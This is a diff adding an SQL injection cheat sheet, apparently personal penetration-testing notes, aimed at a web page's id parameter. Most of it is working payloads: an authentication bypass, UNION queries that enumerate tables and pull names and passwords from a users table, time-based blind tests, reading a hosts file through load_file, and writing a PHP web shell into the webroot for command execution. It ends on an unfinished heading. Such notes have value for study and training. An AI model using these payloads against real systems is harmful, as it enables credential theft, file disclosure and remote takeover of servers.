@@ -1,0 +1,74 @@
+SQL Injection
+
+Classic auth bypass:
+' OR 1=1 limit 1;#
+
+Error Based Enumeration:
+You can try when you see an url like this 10.x.x.x/comment.php?id=292
+Simply adding a simple quote after the number can produce an error.
+
+
+10.x.x.x/comment.php?id=292 order by 1
+10.x.x.x/comment.php?id=292 order by 2
+10.x.x.x/comment.php?id=292 order by 3
+10.x.x.x/comment.php?id=292 order by 4
+10.x.x.x/comment.php?id=292 order by 5
+10.x.x.x/comment.php?id=292 order by 6
+10.x.x.x/comment.php?id=292 order by 7 <= error
+
+You can use this technique to know how many colums there are in the database. If you see an error, it is because there isn't that much columns.
+
+
+10.x.x.x/comment.php?id=292 union select 1,2,3,4,5,6
+
+
+10.x.x.x/comment.php?id=292 union all select 1,2,3,4,@@version,6
+
+10.x.x.x/comment.php?id=292 union all select 1,2,3,4,user(),6
+
+Prints out all tables names of all databases
+10.x.x.x/comment.php?id=292 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+10.x.x.x/comment.php?id=292 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+
+Extract name and passwords from the users table
+10.x.x.x/comment.php?id=292 union all select 1,2,name,4,password,6 FROM users
+
+
+Blind SQL Injection:
+First we can test for sql injection like this:
+10.x.x.x/comment.php?id=292 and 1=1;#
+
+then
+10.x.x.x/comment.php?id=292 and 1=2;#
+
+Does the output changes? If yes, it's vulnerable.
+
+An other method to detect sql injection is to add a sleep statement
+10.x.x.x/comment.php?id=292-sleep(6)
+
+
+If we need to guess the version we can use this technique
+10.x.x.x/comment.php?id=483-IF(MID(@@version,1,1) = '5',sleep(5),0)
+If the query hangs, it's a version beginning with 5 otherwise it's something else.
+
+
+Trying to read a file with an SQL injection looks like this:
+10.x.x.x/comment.php?id=838 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+
+
+If we want to create a malicious php file in the root of the webserver application, it would look like this:
+10.x.x.x/comment.php?id=383 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>". 6 OUTFILE'c:/xampp/htdocs/backdoor.php'
+
+
+Once the backdoor is created, we have command execution. We could access this backdoor like this:
+10.x.x.x/backdoor.php?cmd=ipconfig
+
+
+Bypassing interface restrictions (like search boxes or client side validation):
+
+
+
+
+
+
